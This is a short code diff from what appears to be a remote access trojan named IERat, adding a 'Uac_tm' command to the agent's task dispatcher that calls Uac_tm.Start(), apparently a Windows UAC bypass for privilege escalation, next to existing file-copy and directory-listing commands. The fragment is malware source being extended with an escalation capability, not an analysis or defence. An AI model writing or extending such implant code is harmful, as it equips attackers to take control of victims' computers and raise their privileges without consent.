@@ -303,6 +303,10 @@ namespace IERat.lib
                                 {
                                     NewAgentTask.Result = FileOperations.cp(NewAgentTask.args);
                                 }
+                                else if (CmdType == "Uac_tm")
+                                {
+                                    NewAgentTask.Result = Uac_tm.Start().ToString();
+                                }
                                 else if (CmdType == "ls")
                                 {
                                     string[] entries = Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*");
